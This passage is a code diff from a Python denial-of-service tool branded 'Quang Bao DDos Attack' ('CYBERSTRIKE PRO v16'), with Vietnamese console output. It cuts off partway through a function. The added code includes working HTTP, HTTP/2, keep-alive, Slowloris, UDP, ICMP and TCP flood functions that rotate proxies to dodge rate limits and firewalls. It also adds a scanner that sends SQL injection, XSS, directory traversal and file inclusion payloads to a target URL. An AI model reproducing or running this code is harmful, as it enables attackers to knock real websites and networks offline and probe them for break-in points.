-                            console.print(f"[warning]Proxy {current_proxy} không hoạt động, thử proxy khác... [⚠][/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                            proxy_index = (proxy_index + 1) % len(PROXY_LIST) if PROXY_LIST else 0
-                            current_proxy = get_random_proxy()
-                            retries += 1
-                            continue
-
-                    headers = generate_random_headers()
-                    method = random.choice(http_methods)
-                    endpoint = random.choice(endpoints)
-                    target_url = f"{url}{endpoint}"
-                    payload = random.choice(payloads)
-                    
-                    time.sleep(random.uniform(0.01, 0.1))
-
-                    if method == 'POST':
-                        response = session.post(target_url, headers=headers, data=payload, proxies={"http": current_proxy, "https": current_proxy} if current_proxy else None, timeout=10)
-                    elif method == 'HEAD':
-                        response = session.head(target_url, headers=headers, proxies={"http": current_proxy, "https": current_proxy} if current_proxy else None, timeout=10)
-                    else:
-                        response = session.get(target_url, headers=headers, params=payload, proxies={"http": current_proxy, "https": current_proxy} if current_proxy else None, timeout=10)
-
-                    sound = random.choice(sound_effects)
-                    is_waf_bypassed = response.status_code not in (403, 429)
-                    if is_waf_bypassed:
-                        with manager:
-                            waf_bypass_count += 1
-
-                    with manager:
-                        success_count += 1
-                        response_times.append((time.time() - start_time) * 1000)
-                        error_rate = (error_count / max(1, success_count + error_count)) * 100
-                        ping_avg = sum(response_times) / len(response_times) if response_times else 0
-                        rps = success_count / (time.time() - start_time) if (time.time() - start_time) > 0 else 0
-                        waf_bypass_rate = (waf_bypass_count / max(1, success_count)) * 100
-                        if time.time() - last_rps_time >= 1:
-                            rps_data.append({'time': time.time() - start_time, 'rps': rps})
-                            last_rps_time = time.time()
-
-                    if success_count % 10 == 0:
-                        console.print(f"[success]CLOG: Phương thức: [bold cyan]{method}[/], Endpoint: [bold blue]{endpoint}[/], Mã: [bold {theme_color}]{response.status_code}[/] [✓][/] [yellow]{sound}[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-
-                    with manager:
-                        rps_bar = "█" * min(int(rps / 10), 10)
-                        ping_bar = "█" * min(int(ping_avg / 50), 10)
-                        error_bar = "▒" * min(int(error_rate / 5), 10)
-                        proxy_bar = "▓" * min(int(proxy_error_count / 5), 10)
-                        waf_bar = "★" * min(int(waf_bypass_rate / 10), 10)
-                        rps_color = "bold magenta" if rps > 50 else "bold green" if success_count % 2 == 0 else "bold yellow"
-                        progress.update(task, advance=1, description=f"[bold {rps_color}]TẤN CÔNG CLOG SIÊU CẤP[/] [✓][/] [RPS: {rps_bar} {rps:.1f}] [Ping: {ping_bar} {ping_avg:.1f}ms] [Lỗi: {error_bar} {error_rate:.1f}%] [Proxy lỗi: {proxy_bar} {proxy_error_count}] [WAF Bypass: {waf_bar} {waf_bypass_rate:.1f}%] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                    break
-                except requests.exceptions.ReadTimeout as e:
-                    retries += 1
-                    if retries == max_retries:
-                        with manager:
-                            error_count += 1
-                            error_rate = (error_count / max(1, success_count + error_count)) * 100
-                            ping_avg = sum(response_times) / len(response_times) if response_times else 0
-                            rps = success_count / (time.time() - start_time) if (time.time() - start_time) > 0 else 0
-                            rps_data.append({'time': time.time() - start_time, 'rps': rps})
-                            rps_bar = "█" * min(int(rps / 10), 10)
-                            ping_bar = "█" * min(int(ping_avg / 50), 10)
-                            error_bar = "▒" * min(int(error_rate / 5), 10)
-                            proxy_bar = "▓" * min(int(proxy_error_count / 5), 10)
-                            waf_bar = "★" * min(int(waf_bypass_rate / 10), 10)
-                            rps_color = "bold red" if error_count % 2 == 0 else "bold yellow"
-                            progress.update(task, advance=1, description=f"[bold {rps_color}]TẤN CÔNG CLOG SIÊU CẤP[/] [✗][/] [RPS: {rps_bar} {rps:.1f}] [Ping: {ping_bar} {ping_avg:.1f}ms] [Lỗi: {error_bar} {error_rate:.1f}%] [Proxy lỗi: {proxy_bar} {proxy_error_count}] [WAF Bypass: {waf_bar} {waf_bypass_rate:.1f}%] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                        error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
-                        console.print(f"[error]CLOG: Thất bại sau {max_retries} lần: [red]{error_msg}[/] [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                    else:
-                        console.print(f"[warning]CLOG: Timeout, thử lại lần {retries + 1}... [⚠][/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                        proxy_index = (proxy_index + 1) % len(PROXY_LIST) if PROXY_LIST else 0
-                        current_proxy = get_random_proxy()
-                        time.sleep(random.uniform(0.05, 0.5))
-                except (requests.exceptions.ConnectionError, requests.exceptions.ProxyError) as e:
-                    retries += 1
-                    if retries == max_retries:
-                        with manager:
-                            error_count += 1
-                            proxy_error_count += 1
-                            error_rate = (error_count / max(1, success_count + error_count)) * 100
-                            ping_avg = sum(response_times) / len(response_times) if response_times else 0
-                            rps = success_count / (time.time() - start_time) if (time.time() - start_time) > 0 else 0
-                            rps_data.append({'time': time.time() - start_time, 'rps': rps})
-                            rps_bar = "█" * min(int(rps / 10), 10)
-                            ping_bar = "█" * min(int(ping_avg / 50), 10)
-                            error_bar = "▒" * min(int(error_rate / 5), 10)
-                            proxy_bar = "▓" * min(int(proxy_error_count / 5), 10)
-                            waf_bar = "★" * min(int(waf_bypass_rate / 10), 10)
-                            rps_color = "bold red" if error_count % 2 == 0 else "bold yellow"
-                            progress.update(task, advance=1, description=f"[bold {rps_color}]TẤN CÔNG CLOG SIÊU CẤP[/] [✗][/] [RPS: {rps_bar} {rps:.1f}] [Ping: {ping_bar} {ping_avg:.1f}ms] [Lỗi: {error_bar} {error_rate:.1f}%] [Proxy lỗi: {proxy_bar} {proxy_error_count}] [WAF Bypass: {waf_bar} {waf_bypass_rate:.1f}%] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                        error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
-                        console.print(f"[error]CLOG: Kết nối thất bại: [red]{error_msg}[/] [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                    else:
-                        console.print(f"[warning]CLOG: Lỗi kết nối, thử lại lần {retries + 1}... [⚠][/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                        proxy_index = (proxy_index + 1) % len(PROXY_LIST) if PROXY_LIST else 0
-                        current_proxy = get_random_proxy()
-                        time.sleep(random.uniform(0.05, 0.5))
-                except Exception as e:
-                    if "Tunnel connection failed: 400 Bad Request" in str(e):
-                        with manager:
-                            proxy_error_count += 1
-                        console.print(f"[warning]Proxy lỗi 400: {current_proxy}, thử proxy khác... [⚠][/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                        proxy_index = (proxy_index + 1) % len(PROXY_LIST) if PROXY_LIST else 0
-                        current_proxy = get_random_proxy()
-                        retries += 1
-                        continue
-                    with manager:
-                        error_count += 1
-                        error_rate = (error_count / max(1, success_count + error_count)) * 100
-                        ping_avg = sum(response_times) / len(response_times) if response_times else 0
-                        rps = success_count / (time.time() - start_time) if (time.time() - start_time) > 0 else 0
-                        rps_data.append({'time': time.time() - start_time, 'rps': rps})
-                        rps_bar = "█" * min(int(rps / 10), 10)
-                        ping_bar = "█" * min(int(ping_avg / 50), 10)
-                        error_bar = "▒" * min(int(error_rate / 5), 10)
-                        proxy_bar = "▓" * min(int(proxy_error_count / 5), 10)
-                        waf_bar = "★" * min(int(waf_bypass_rate / 10), 10)
-                        rps_color = "bold red" if error_count % 2 == 0 else "bold yellow"
-                        progress.update(task, advance=1, description=f"[bold {rps_color}]TẤN CÔNG CLOG SIÊU CẤP[/] [✗][/] [RPS: {rps_bar} {rps:.1f}] [Ping: {ping_bar} {ping_avg:.1f}ms] [Lỗi: {error_bar} {error_rate:.1f}%] [Proxy lỗi: {proxy_bar} {proxy_error_count}] [WAF Bypass: {waf_bar} {waf_bypass_rate:.1f}%] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                    error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
-                    console.print(f"[error]CLOG: Thất bại: [red]{error_msg}[/] [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-                    break
-                time.sleep(random.uniform(0.00005, 0.0002))
-    finally:
-        session.close()
-
-# Scan vulnerabilities
+# Enhanced Web Vulnerability Scanner
 async def scan_vulnerabilities(url):
     vulnerabilities = []
     async with aiohttp.ClientSession() as session:
+        # Check for SQL Injection
         try:
-            sql_payloads = ["' OR '1'='1", "1; DROP TABLE users --"]
+            sql_payloads = ["' OR '1'='1", "1; DROP TABLE users --", "' UNION SELECT NULL, NULL --"]
             for payload in sql_payloads:
-                async with session.get(f"{url}?id={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=10) as response:
+                async with session.get(f"{url}?id={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=5) as response:
                     text = await response.text()
-                    if any(error in text.lower() for error in ["sql syntax", "mysql"]):
+                    if any(error in text.lower() for error in ["sql syntax", "mysql", "database error", "syntax error"]):
                         vulnerabilities.append({
                             "type": "SQL Injection",
                             "severity": "High",
-                            "description": f"SQL Injection: {payload}",
-                            "recommendation": "Sử dụng prepared statements."
+                            "description": f"Potential SQL Injection vulnerability detected with payload: {payload}",
+                            "recommendation": "Sanitize and validate all user inputs, use prepared statements."
                         })
                         break
         except Exception as e:
-            error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
-            console.print(f"[error]SQL Scan: Lỗi: [red]{error_msg}[/] [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
+            console.print(f"[warning][VULN SCAN] SQL Injection scan failed: {str(e)}[/]")
 
+        # Check for Cross-Site Scripting (XSS)
         try:
-            xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
+            xss_payloads = [
+                "<script>alert('XSS')</script>",
+                "<img src=x onerror=alert('XSS')>",
+                "javascript:alert('XSS')"
+            ]
             for payload in xss_payloads:
-                async with session.get(f"{url}?q={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=10) as response:
+                async with session.get(f"{url}?q={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=5) as response:
                     text = await response.text()
-                    if payload in text:
+                    if payload in text or "alert('XSS')" in text:
                         vulnerabilities.append({
                             "type": "Cross-Site Scripting (XSS)",
                             "severity": "Medium",
-                            "description": f"Reflected XSS: {payload}",
-                            "recommendation": "Mã hóa output."
+                            "description": f"Reflected XSS vulnerability detected with payload: {payload}",
+                            "recommendation": "Encode all output, implement Content Security Policy (CSP)."
                         })
                         break
         except Exception as e:
-            error_msg = str(e).replace("[", "\\[").replace("]", "\\]")
-            console.print(f"[error]XSS Scan: Lỗi: [red]{error_msg}[/] [✗][/] [yellow]*CRASH*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
+            console.print(f"[warning][VULN SCAN] XSS scan failed: {str(e)}[/]")
+
+        # Check for CSRF
+        try:
+            async with session.get(url, headers=generate_random_headers(), timeout=5) as response:
+                text = await response.text()
+                soup = BeautifulSoup(text, 'html.parser')
+                forms = soup.find_all('form')
+                for form in forms:
+                    if not form.find('input', {'name': lambda x: x and 'csrf' in x.lower()}):
+                        vulnerabilities.append({
+                            "type": "CSRF",
+                            "severity": "Medium",
+                            "description": f"Form at {form.get('action', 'unknown')} lacks CSRF token.",
+                            "recommendation": "Implement CSRF tokens in all forms."
+                        })
+        except Exception as e:
+            console.print(f"[warning][VULN SCAN] CSRF scan failed: {str(e)}[/]")
+
+        # Check for Directory Traversal
+        try:
+            traversal_payloads = ["../../etc/passwd", "../config.php", "../../../windows/win.ini"]
+            for payload in traversal_payloads:
+                async with session.get(f"{url}?file={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=5) as response:
+                    text = await response.text()
+                    if any(indicator in text.lower() for indicator in ["root:", "[extensions]", "password"]):
+                        vulnerabilities.append({
+                            "type": "Directory Traversal",
+                            "severity": "High",
+                            "description": f"Potential Directory Traversal vulnerability detected with payload: {payload}",
+                            "recommendation": "Validate and sanitize file paths, restrict access to sensitive directories."
+                        })
+                        break
+        except Exception as e:
+            console.print(f"[warning][VULN SCAN] Directory Traversal scan failed: {str(e)}[/]")
+
+        # Check for Local/Remote File Inclusion
+        try:
+            lfi_payloads = ["php://filter/convert.base64-encode/resource=index.php", "/etc/passwd"]
+            for payload in lfi_payloads:
+                async with session.get(f"{url}?include={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=5) as response:
+                    text = await response.text()
+                    if any(indicator in text.lower() for indicator in ["php", "root:", "base64"]):
+                        vulnerabilities.append({
+                            "type": "File Inclusion",
+                            "severity": "Critical",
+                            "description": f"Potential File Inclusion vulnerability detected with payload: {payload}",
+                            "recommendation": "Disable allow_url_include, validate include paths."
+                        })
+                        break
+        except Exception as e:
+            console.print(f"[warning][VULN SCAN] File Inclusion scan failed: {str(e)}[/]")
+
+        # Check Server Headers
+        try:
+            async with session.get(url, headers=generate_random_headers(), timeout=5) as response:
+                server = response.headers.get('Server', '')
+                x_powered_by = response.headers.get('X-Powered-By', '')
+                if server or x_powered_by:
+                    vulnerabilities.append({
+                        "type": "Server Information Disclosure",
+                        "severity": "Low",
+                        "description": f"Server headers exposed: Server={server}, X-Powered-By={x_powered_by}",
+                        "recommendation": "Disable unnecessary server headers."
+                    })
+        except Exception as e:
+            console.print(f"[warning][VULN SCAN] Server header scan failed: {str(e)}[/]")
+
+        # Check SSL/TLS Configuration
+        try:
+            parsed_url = urllib.parse.urlparse(url)
+            if parsed_url.scheme == 'https':
+                context = ssl.create_default_context()
+                with socket.create_connection((parsed_url.hostname, 443)) as sock:
+                    with context.wrap_socket(sock, server_hostname=parsed_url.hostname) as ssock:
+                        cert = ssock.getpeercert()
+                        cipher = ssock.cipher()
+                        if cipher[1] in ['TLSv1.0', 'TLSv1.1', 'SSLv3']:
+                            vulnerabilities.append({
+                                "type": "Weak SSL/TLS Configuration",
+                                "severity": "High",
+                                "description": f"Outdated TLS version detected: {cipher[1]}.",
+                                "recommendation": "Use TLS 1.2 or higher, disable deprecated protocols."
+                            })
+                        if 'RSA' in cipher[0] and cert.get('subjectAltName', []):
+                            vulnerabilities.append({
+                                "type": "Weak SSL Cipher",
+                                "severity": "Medium",
+                                "description": f"Weak cipher suite detected: {cipher[0]}.",
+                                "recommendation": "Use strong cipher suites (e.g., ECDHE)."
+                            })
+        except Exception as e:
+            console.print(f"[warning][VULN SCAN] SSL/TLS scan failed: {str(e)}[/]")
 
     return vulnerabilities
 
-# Display vulnerability report
-def display_vulnerability_report(vulnerabilities, theme_color):
-    panel = Panel(
-        "\n".join(
-            f"[bold magenta]Loại:[/] {vuln['type']}\n"
-            f"[bold yellow]Mức độ:[/] {vuln['severity']}\n"
-            f"[bold cyan]Mô tả:[/] {vuln['description']}\n"
-            f"[bold green]Khuyến nghị:[/] {vuln['recommendation']}\n"
-            for vuln in vulnerabilities
-        ) or "[success]Không phát hiện lỗ hổng! [✓][/] [yellow]*HUM*[/] [yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]",
-        title=f"[bold {theme_color}]BÁO CÁO LỖ HỔNG[/]",
-        border_style="bold cyan"
-    )
-    console.print("")
-    console.print(panel)
-    hacker_prompt("Nhấn Enter để quay lại: ", theme_color=theme_color)
-
-# Display menu
-def display_menu(theme_color):
-    title = "☠️ CYBERSTRIKE PRO v16 ☠️"
-    frames = [
-        f"[bold cyan]╠═╦═╩╦╩╦═╗ {title} ╠══╗[/]",
-        f"[bold magenta]║╬║╬╠╗╩╩╩╩╗ {title} ╠══╗[/]",
-        f"[bold purple]║╩╩╩╩╩╩╩╩╩╗ {title} ╠══╗[/]",
-        f"[bold cyan]╚╩╩╩╩╩╩╩╩╩╝ {title} ╠══╗[/]",
-        f"[bold magenta]╠═╦═╩╦╩╦═╗ {title} ╠══╗[/]"
-    ]
-    for frame in frames:
-        console.print(frame)
-        time.sleep(0.08)
-
-    table = Table(show_header=True, header_style=f"bold {theme_color}", border_style="bold cyan", title=f"[bold {theme_color}]{title}[/]")
-    table.add_column("☠️ LỰA CHỌN ☠️", justify="center", style="bold magenta", width=12)
-    table.add_column("☠️ CHỨC NĂNG ☠️", justify="center", style="bold magenta", width=20)
-
-    table.add_row("1", "[bold magenta]TẤN CÔNG CLOG SIÊU CẤP[/]")
-    table.add_row("2", "[bold magenta]QUÉT LỖ HỔNG[/]")
-    table.add_row("3", "[bold magenta]THOÁT[/]")
-    table.add_row("4", "[bold magenta]TẤN CÔNG VÔ HẠN[/]")
-    table.add_row("5", "[bold magenta]TẤN CÔNG IP GỐC[/]")
-
-    console.print(f"[bold {theme_color}]╠═╦═╩╦╩╦═╗[/]")
+# Display Vulnerability Report
+def display_vulnerability_report(vulnerabilities):
+    table = Table(title="BÁO CÁO LỖ HỔNG BẢO MẬT", style="info")
+    table.add_column("Loại", style="highlight")
+    table.add_column("Mức độ", style="warning")
+    table.add_column("Mô tả")
+    table.add_column("Khuyến nghị", style="success")
+    for vuln in vulnerabilities:
+        table.add_row(vuln["type"], vuln["severity"], vuln["description"], vuln["recommendation"])
     console.print(table)
-    console.print(f"[bold {theme_color}]╚╩╩╩╩╩╩╩╩╝[/]")
-    console.print(f"[yellow]☠️ ©2025 Quang Bao DDos Attack ☠️[/]")
-    console.print("")
+    if not vulnerabilities:
+        console.print("[success][VULN SCAN] Không phát hiện lỗ hổng nào![/]")
+    else:
+        console.print(f"[warning][VULN SCAN] Phát hiện {len(vulnerabilities)} lỗ hổng tiềm ẩn![/]")
+    Prompt.ask("[info]Nhấn Enter để trở về menu...[/]")
+
+# Persistent attack process
+def persistent_attack_process(url, requests_per_thread):
+    session = requests.Session()
+    methods = ["GET", "POST", "HEAD"]
+    while True:
+        try:
+            method = random.choice(methods)
+            headers = generate_random_headers()
+            proxy = get_random_proxy()
+            payload = "X" * random.randint(102400, 204800)
+            if method == "GET":
+                response = session.get(url, headers=headers, proxies=proxy, timeout=2)
+            elif method == "POST":
+                response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=2)
+            else:
+                response = session.head(url, headers=headers, proxies=proxy, timeout=2)
+            if response.status_code in (429, 403, 522):
+                console.print(f"[error][LIÊN TỤC] Tấn công: Mã trạng thái {response.status_code} - MỤC TIÊU QUÁ TẢI[/]")
+            else:
+                console.print(f"[warning][LIÊN TỤC] Tấn công: Mã trạng thái {response.status_code}[/]")
+        except Exception as e:
+            console.print(f"[error][LIÊN TỤC] Tấn công thất bại: {str(e)}[/]")
+        time.sleep(random.uniform(0.0001, 0.001))
+
+# HTTP/2 Multiplexing attack
+def http2_multiplexing_attack(url):
+    if not HTTP2_AVAILABLE:
+        console.print("[error][HTTP/2] Tấn công bị vô hiệu hóa: Chưa cài đặt module 'h2'[/]")
+        return
+    parsed_url = urllib.parse.urlparse(url)
+    host = parsed_url.hostname
+    port = parsed_url.port or 443
+    try:
+        conn = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
+        h2_conn = h2.connection.H2Connection()
+        h2_conn.initiate_connection()
+        conn.send(h2_conn.data_to_send())
+        headers = {
+            ':method': 'GET',
+            ':path': '/',
+            ':scheme': 'https',
+            ':authority': host,
+            'user-agent': random.choice(USER_AGENTS),
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'accept-language': 'en-US,en;q=0.9',
+            'accept-encoding': 'gzip, deflate, br',
+        }
+        while True:
+            for stream_id in range(1, 100, 2):
+                h2_conn.send_headers(stream_id, headers)
+                conn.send(h2_conn.data_to_send())
+            response = conn.getresponse()
+            response.read()
+            if response.status in (429, 403, 522):
+                console.print(f"[error][HTTP/2] Tấn công: Mã trạng thái {response.status} - MỤC TIÊU QUÁ TẢI[/]")
+            else:
+                console.print(f"[warning][HTTP/2] Tấn công: Mã trạng thái {response.status}[/]")
+            time.sleep(0.001)
+    except Exception as e:
+        console.print(f"[error][HTTP/2] Tấn công thất bại: {str(e)}[/]")
+    finally:
+        conn.close()
+
+# Keep-Alive + Pipelining attack
+def keep_alive_pipelining_attack(url):
+    session = requests.Session()
+    headers = generate_random_headers()
+    headers['Connection'] = 'keep-alive'
+    headers['Keep-Alive'] = 'timeout=5, max=1000'
+    proxy = get_random_proxy()
+    while True:
+        try:
+            for _ in range(10):
+                session.get(url, headers=headers, proxies=proxy, timeout=2)
+            response = session.get(url, headers=headers, proxies=proxy, timeout=2)
+            if response.status_code in (429, 403, 522):
+                console.print(f"[error][KEEP-ALIVE] Tấn công: Mã trạng thái {response.status_code} - MỤC TIÊU QUÁ TẢI[/]")
+            else:
+                console.print(f"[warning][KEEP-ALIVE] Tấn công: Mã trạng thái {response.status_code}[/]")
+        except Exception as e:
+            console.print(f"[error][KEEP-ALIVE] Tấn công thất bại: {str(e)}[/]")
+        time.sleep(0.001)
+
+# Multiprocessing attack
+def multiprocessing_attack(url, requests_per_process):
+    session = requests.Session()
+    methods = ["GET", "POST", "HEAD"]
+    while True:
+        try:
+            method = random.choice(methods)
+            headers = generate_random_headers()
+            proxy = get_random_proxy()
+            payload = "X" * random.randint(102400, 204800)
+            if method == "GET":
+                response = session.get(url, headers=headers, proxies=proxy, timeout=2)
+            elif method == "POST":
+                response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=2)
+            else:
+                response = session.head(url, headers=headers, proxies=proxy, timeout=2)
+            if response.status_code in (429, 403, 522):
+                console.print(f"[error][ĐA TIẾN TRÌNH] Tấn công: Mã trạng thái {response.status_code} - MỤC TIÊU QUÁ TẢI[/]")
+            else:
+                console.print(f"[warning][ĐA TIẾN TRÌNH] Tấn công: Mã trạng thái {response.status_code}[/]")
+        except Exception as e:
+            console.print(f"[error][ĐA TIẾN TRÌNH] Tấn công thất bại: {str(e)}[/]")
+        time.sleep(0.001)
+
+# Multiprocessing + Async attack
+async def async_request(url, session):
+    try:
+        headers = generate_random_headers()
+        proxy = get_random_proxy()
+        async with session.get(url, headers=headers, proxy=proxy, timeout=2) as response:
+            if response.status in (429, 403, 522):
+                console.print(f"[error][ĐA TIẾN TRÌNH+ASYNC] Tấn công: Mã trạng thái {response.status} - MỤC TIÊU QUÁ TẢI[/]")
+            else:
+                console.print(f"[warning][ĐA TIẾN TRÌNH+ASYNC] Tấn công: Mã trạng thái {response.status}[/]")
+    except Exception as e:
+        console.print(f"[error][ĐA TIẾN TRÌNH+ASYNC] Tấn công thất bại: {str(e)}[/]")
+
+async def multiprocessing_async_attack(url):
+    async with aiohttp.ClientSession(headers=generate_random_headers()) as session:
+        while True:
+            tasks = [async_request(url, session) for _ in range(10)]
+            await asyncio.gather(*tasks)
+            await asyncio.sleep(0.001)
+
+def multiprocessing_async_wrapper(url, requests_per_process):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(multiprocessing_async_attack(url))
+
+# Layer 4 UDP Flood
+def udp_flood_attack(host, port):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while True:
+            payload = os.urandom(random.randint(64, 1400))
+            sock.sendto(payload, (host, port))
+            console.print(f"[error][UDP FLOOD] Gửi gói tin đến {host}:{port}[/]")
+            time.sleep(0.0001)
+    except Exception as e:
+        console.print(f"[error][UDP FLOOD] Tấn công thất bại: {str(e)}[/]")
+    finally:
+        sock.close()
+
+# Layer 4 ICMP Flood
+def icmp_flood_attack(host):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+        sock.settimeout(1)
+        while True:
+            payload = os.urandom(60000)
+            icmp_packet = struct.pack("!BBHHH", 8, 0, 0, 0, 0) + payload
+            sock.sendto(icmp_packet, (host, 0))
+            console.print(f"[error][ICMP FLOOD] Gửi gói tin ICMP đến {host}[/]")
+            time.sleep(0.0001)
+    except PermissionError:
+        console.print("[error][ICMP FLOOD] Lỗi: Cần quyền root để gửi gói tin ICMP[/]")
+    except Exception as e:
+        console.print(f"[error][ICMP FLOOD] Tấn công thất bại: {str(e)}[/]")
+    finally:
+        sock.close()
+
+# Layer 4 TCP/UDP Flood
+def layer4_tcp_udp_flood(host, port):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(1)
+        attack_types = ["SYN", "ACK", "RST"]
+        while True:
+            try:
+                attack_type = random.choice(attack_types)
+                if attack_type == "SYN":
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.connect((host, port))
+                    sock.send(b"\x00" * random.randint(64, 1400))
+                elif attack_type == "ACK":
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.connect((host, port))
+                    sock.send(b"\x10" * random.randint(64, 1400))
+                else:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.connect((host, port))
+                    sock.send(b"\x04" * random.randint(64, 1400))
+                console.print(f"[error][TCP/UDP FLOOD] Gửi {attack_type} đến {host}:{port}[/]")
+            except:
+                pass
+            time.sleep(0.0001)
+    except Exception as e:
+        console.print(f"[error][TCP/UDP FLOOD] Tấn công thất bại: {str(e)}[/]")
+    finally:
+        sock.close()
+
+# Layer 7 WAF Bypass attack
+def layer7_waf_bypass_attack(url):
+    session = requests.Session()
+    methods = ["GET", "POST", "HEAD"]
+    while True:
+        try:
+            method = random.choice(methods)
+            headers = generate_random_headers()
+            proxy = get_random_proxy()
+            payload = "X" * random.randint(102400, 204800)
+            if HTTP2_AVAILABLE and urllib.parse.urlparse(url).scheme == 'https':
+                http2_multiplexing_attack(url)
+            else:
+                headers['Connection'] = 'keep-alive'
+                headers['Keep-Alive'] = 'timeout=5, max=1000'
+                if method == "GET":
+                    response = session.get(url, headers=headers, proxies=proxy, timeout=2)
+                elif method == "POST":
+                    response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=2)
+                else:
+                    response = session.head(url, headers=headers, proxies=proxy, timeout=2)
+                if response.status_code in (429, 403, 522):
+                    console.print(f"[error][WAF BYPASS] Tấn công: Mã trạng thái {response.status_code} - MỤC TIÊU QUÁ TẢI[/]")
+                else:
+                    console.print(f"[warning][WAF BYPASS] Tấn công: Mã trạng thái {response.status_code}[/]")
+        except Exception as e:
+            console.print(f"[error][WAF BYPASS] Tấn công thất bại: {str(e)}[/]")
+        time.sleep(random.uniform(0.0001, 0.001))
+
+# Slowloris attack
+def slowloris_attack(url, duration):
+    session = requests.Session()
+    sockets = []
+    try:
+        for _ in range(500):
+            headers = generate_random_headers()
+            headers['Connection'] = 'keep-alive'
+            sock = session.get(url, headers=headers, proxies=get_random_proxy(), timeout=30, stream=True)
+            sockets.append(sock)
+            time.sleep(0.01)
+        time.sleep(duration)
+    except Exception as e:
+        console.print(f"[error][SLOWLORIS] Lỗi: {str(e)}[/]")
+    finally:
+        for sock in sockets:
+            sock.close()
+
+# HTTP Flood attack
+def http_flood_attack(url, request_count):
+    session = requests.Session()
+    while True:
+        try:
+            headers = generate_random_headers()
+            proxy = get_random_proxy()
+            payload = "A" * 102400
+            response = session.post(url, data=payload, headers=generate_random_headers(), proxies=proxy, timeout=5)
+            console.print(f"[error][HTTP FLOOD] Tấn công: Mã trạng thái {response.status_code}[/]")
+        except Exception as e:
+            console.print(f"[error][HTTP FLOOD] Tấn công thất bại: {str(e)}[/]")
+        time.sleep(0.001)
+
+# Generic request sender for basic attacks
+def send_request(url, request_count):
+    session = requests.Session()
+    methods = ["GET", "POST", "HEAD"]
+    for _ in range(request_count):
+        try:
+            method = random.choice(methods)
+            headers = generate_random_headers()
+            proxy = get_random_proxy()
+            payload = "X" * random.randint(102400, 204800)
+            start_time = time.time()
+            if method == "GET":
+                response = session.get(url, headers=headers, proxies=proxy, timeout=2)
+            elif method == "POST":
+                response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=2)
+            else:
+                response = session.head(url, headers=headers, proxies=proxy, timeout=2)
+            response_time = (time.time() - start_time) * 1000  # Convert to ms
+            with manager:
+                global success_count, error_count, response_times
+                success_count += 1
+                response_times.append(response_time)
+            if response.status_code in (429, 403, 522):
+                console.print(f"[error][GỬI YÊU CẦU] Tấn công: Mã trạng thái {response.status_code} - MỤC TIÊU QUÁ TẢI[/]")
+            else:
+                console.print(f"[warning][GỬI YÊU CẦU] Tấn công: Mã trạng thái {response.status_code}[/]")
+        except Exception as e:
+            with manager:
+                global error_count
+                error_count += 1
+            console.print(f"[error][GỬI YÊU CẦU] Tấn công thất bại: {str(e)}[/]")
+        time.sleep(random.uniform(0.0001, 0.001))
+
+# Unlimited threads attack
+def unlimited_threads_attack(url):
+    session = requests.Session()
+    while True:
+        try:
+            headers = generate_random_headers()
+            proxy = get_random_proxy()
+            payload = "A" * 102400
+            response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=3)
+            console.print(f"[error][VÔ HẠN] Tấn công: Mã trạng thái {response.status_code}[/]")
+        except Exception as e:
+            console.print(f"[error][VÔ HẠN] Tấn công thất bại: {str(e)}[/]")
+        time.sleep(0.001)
+
+# 429/403 Overload attack
+def overload_429_403_attack(url, request_count):
+    session = requests.Session()
+    while True:
+        try:
+            headers = generate_random_headers()
+            proxy = get_random_proxy()
+            method = random.choice(["GET", "POST", "HEAD"])
+            if method == "GET":
+                response = session.get(url, headers=headers, proxies=proxy, timeout=2)
+            elif method == "POST":
+                response = session.post(url, data=POST_DATA, headers=headers, proxies=proxy, timeout=2)
+            else:
+                response = session.head(url, headers=headers, proxies=proxy, timeout=2)
+            if response.status_code in (429, 403):
